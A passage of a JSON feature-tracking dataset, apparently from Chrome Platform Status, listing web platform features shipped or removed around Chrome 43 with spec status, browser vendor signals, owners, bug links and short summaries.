    "summary": "This is to change the behavior of ChannelMergerNode when the input changes dynamically. There have been  critical issues with the previous implementation. (See related issues for the detail)\r\n\r\nTo address these issues, a new proposal for the ChannelMergerNode was made. The proposal effectively makes the channel order in the merger node static after the instantiation.\r\n\r\n",
    "id": 5721501693116416,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/304",
        "crbug.com/441451",
        "",
        "https://github.com/WebAudio/web-audio-api/issues/459",
        "crbug.com/442925",
        "",
        "https://github.com/WebAudio/web-audio-api/issues/304#issuecomment-69641498",
        "",
        ""
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:21:43.614480",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: Disallow setting AudioBufferSourceNode.buffer more than once",
    "comments": "Use counter metrics indicates that there was no usage of setting the buffer attribute more than once.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 44
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 44,
        "ios": 44,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "http://crbug.com/455373",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Setting AudioBufferSourceNode.buffer again after it has already been set to a non-null buffer is no longer allowed and will generate an exception.\r\n\r\nThis feature was deprecated and is now being removed",
    "id": 5248179385663488,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/288",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioBufferSourceNode/buffer"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 06:19:23.784150",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "Allow JS-triggered copy/cut with a user gesture",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/2006/webapi/clipops/clipops.html#events-that-are-allowed-to-modify-the-clipboard",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "ios": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://crbug.com/437908",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "execCommand(\"copy\") and execCommand(\"cut\") should be allowed to modify the system clipboard in the context of a user gesture (the spec uses the language \"allowed to show a popup\").",
    "id": 5223997243392000,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/document.execCommand",
        "http://updates.html5rocks.com/2015/04/cut-and-copy-commands"
      ],
      "samples": [
        "http://jsbin.com/yanamebope/quiet",
        "https://github.com/GoogleChrome/samples/tree/gh-pages/cut-and-copy"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 06:18:26.528500",
      "by": "Patket@microsoft.com"
    },
    "name": "CSSOM Document.elementsFromPoint API",
    "tags": [
      "elementsfrompoint"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#dom-document-elementsfrompoint",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "pdr@chromium.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=448529",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh772121",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API on Document for returning the sequence of elements under a point.",
    "id": 5743177185099776,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/document/elementsFromPoint"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-04-26 06:17:48.916740",
      "by": "Patket@microsoft.com"
    },
    "name": "Cache API (global scope)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/#cache-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/showdependencytree.cgi?id=903441&hide_resolved=0",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "jsbell@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "http://crbug.com/455282",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/serviceworker?term=Service%20Worker",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Cache API allows authors to fully and conveniently manage their content caches for offline use. An origin can have multiple, named Cache objects.\r\n\r\nThis API is already available in a Service Worker context. This entry is to make it available globally (=> accessible from a document context).",
    "id": 5072127703121920,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache",
        "https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/service-worker/window-caches"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-07-25 04:45:40.728340",
      "by": "tyoshino@chromium.org"
    },
    "name": "Fetch API: Streaming response body",
    "comments": "In the future response.body will be upgraded to a ReadableStream with an underlying byte source in backward compatible way.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://fetch.spec.whatwg.org/#response-class",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.wanderview.com/blog/2015/06/19/intent-to-implement-streams-in-firefox/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=240603",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Addition of the response.body property to the Fetch API. response.body is a ReadableStream from the Streams Standard.",
    "id": 5804334163951616,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/35_QSL1ABTY",
        "https://streams.spec.whatwg.org/#rs",
        "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/fetch-api/fetch-response-stream.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:59.348920",
      "by": "ericbidelman@google.com"
    },
    "name": "MouseEvent.buttons",
    "comments": "WebKit bug: https://bugs.webkit.org/show_bug.cgi?id=81855",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/uievents/#widl-MouseEvent-buttons",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent/buttons",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "jinho.bang@samsung.com",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=276941",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/ff974878(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The 'buttons' property on MouseEvent indicates (for ALL mouse events) which combination of buttons are current down.  ",
    "id": 5724163801088000,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent/buttons"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:09.844620",
      "by": "ericbidelman@google.com"
    },
    "name": "Move DOM attributes to prototype chains.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://heycam.github.io/webidl/#es-attributes",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "haraken@chromium.org",
          "yukishiino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=476428",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Blink has placed DOM attributes on instances instead of prototypes.  However, the Web IDL spec requires that DOM attributes must be placed on prototype chains (except for a few exceptions such as static attributes and [Unforgeable].)\r\n\r\nWe move DOM attributes on instances to prototype chains following the spec.",
    "id": 6052436003258368,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/04/DOM-attributes-now-on-the-prototype"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-12-02 09:11:34.608830",
      "by": "vinamrata@google.com"
    },
    "name": "Permissions API",
    "comments": "'camera' and 'microphone' are supported for querying via the Permissions API starting with Chrome 64.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://w3c.github.io/permissions/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1105827",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "mlamouri@chromium.org",
          "timvolodine@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink>PermissionsAPI"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=432570",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Permissions API allows a web application to be aware of the status of a given permission, to know whether it is granted, denied or if the user will be asked whether the permission should be granted. The purpose of the API is to improve general UX with regards to permissions on the Web, allowing developers to be aware of what is going to happen will enable better flow.",
    "id": 6376494003650560,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2015/04/permissions-api-for-the-web",
        "https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/permissions/index.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:02.838040",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove designMode inheritance from ancestors",
    "comments": "Firefox already implements this behavior, and IE effectively implements it as well. The proposed behavior also matches the spec and removes implementation complexity for out-of-process iframes.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#making-entire-documents-editable:-the-designmode-idl-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://crbug.com/469978",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Change the initial value of document.designMode from \"inherit\" to \"off\" and remove support for \"inherit\".",
    "id": 5748821980086272,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:10.678640",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS Animations",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://dev.w3.org/csswg/css-animations-1/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "alancutter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=154771",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=93136",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "CSS Animations without the -webkit- prefix.",
    "id": 6121990213599232,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Using_CSS_animations"
      ],
      "samples": [
        "https://jsfiddle.net/cm1yrqy2/3/embedded/result/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-26 06:16:22.414990",
      "by": "Patket@microsoft.com"
    },
    "name": "Upgrade insecure requests",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec/specs/upgrade/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1139297",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://crbug.com/455674",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/7314353-upgrade-insecure-requests",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=143653",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "We encourage authors to transition their sites and applications away from insecure transport, and onto encrypted and authenticated connections, but mixed content checking causes headaches. This feature allows authors to ask the user agent to transparently upgrade HTTP resources to HTTPS to ease the migration burden.",
    "id": 6534575509471232,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#upgrade-insecure-requests"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/csp-upgrade-insecure-requests"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-02-28 17:01:45.748640",
      "by": "jmedley@google.com"
    },
    "name": "Web MIDI API",
    "comments": "IE views: Web MIDI API is currently listed as \"Not currently planned\". However, Web Audio API which is a pre-requisite for a significant chunk of the use cases is in development (https://status.modern.ie/webaudioapi?term=web%20audio)",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://webaudio.github.com/web-midi-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=836897",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "toyoshim@chromium.org",
          "cwilso@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "http://crbug.com/163795",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webmidiapi",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Defines an API supporting the MIDI protocol, enabling web applications to enumerate and select MIDI input and output devices on the client system and send and receive MIDI messages.",
    "id": 4923613069180928,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MIDIAccess",
        "https://developer.mozilla.org/en-US/docs/Web/API/MIDIConnectionEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/MIDIInput"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:40.481240",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Allow developers to close an AudioContext explicitly",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "bug": "http://crbug.com/439241",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An AudioContext can now be explicitly closed, thereby releasing any hardware resources associated with the AudioContext. Without this, developers had to depend on garbage collection of the AudioContext to release hardware resources.",
    "id": 5411681005993984,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#widl-AudioContext-close-Promise;",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext/close"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/webaudio-audiocontext-close"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:12:40.016440",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: AudioBuffer copyFromChannel and copyToChannel",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=361859",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support the copyFromChannel and copyToChannel methods on a WebAudio AudioBuffer",
    "id": 6107438864400384,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#widl-AudioBuffer-copyFromChannel-void-Float32Array-destination-long-channelNumber-unsigned-long-startInChannel",
        "http://webaudio.github.io/web-audio-api/#widl-AudioBuffer-copyToChannel-void-Float32Array-source-long-channelNumber-unsigned-long-startInChannel",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioBuffer/copyFromChannel",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioBuffer/copyToChannel"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:11:27.616430",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: Selective Disconnection on AudioNode.disconnect()",
    "tags": [
      "Web Audio API",
      "AudioNode",
      "Disconnect"
    ],
    "comments": "See WG discussion: https://github.com/WebAudio/web-audio-api/issues/6",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/#idl-def-AudioNode",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WebAudio/web-audio-api/issues/6",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=448071",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Currently AudioNode.disconnect() disconnects all existing connections from output(s) of the AudioNode. This is to support disconnecting only one connection.\r\n\r\nThere have been numerous requests to support selective disconnection with disconnect() method and Audio WG agreed to change the spec to accommodate the feature request. With this change, it is possible to disconnect a signal path out of multiple connections to AudioNode input or AudioParam.",
    "id": 4793068276416512,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioNode/disconnect"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/webaudio-audionode-disconnect"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:26.904590",
      "by": "ericbidelman@google.com"
    },
    "name": "autocapitalize",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/mounirlamouri/html-autocapitalize/blob/master/proposal.md",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-whatwg-archive/2015Mar/0022.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 43
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "ios": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://crbug.com/466930",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/mounirlamouri/html-autocapitalize/issues/1",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/safari/documentation/AppleApplications/Reference/SafariHTMLRef/Articles/Attributes.html#//apple_ref/doc/uid/TP40008058-autocapitalize",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables web pages to give hint with regards to the autocapitalization behaviour to use on text fields.",
    "id": 4529989986811904,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/autocapitalize"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:38.269860",
      "by": "ericbidelman@google.com"
    },
    "name": "overflowchanged event",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 43
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 43,
        "blink_components": [
          "Blink"
        ],
        "desktop": 43,
        "flag": false,
        "android": 43,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=460822",
        "intervention": false
      },
      "opera": {
        "android": 30,
        "desktop": 30
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The overflowchanged event and the OverflowEvent interface have been removed.",
    "id": 5242458724106240,
    "resources": {
      "docs": [
        "http://trevorbrindle.com/chrome-43-broke-sencha/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:28.411950",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Classes (ES6)",
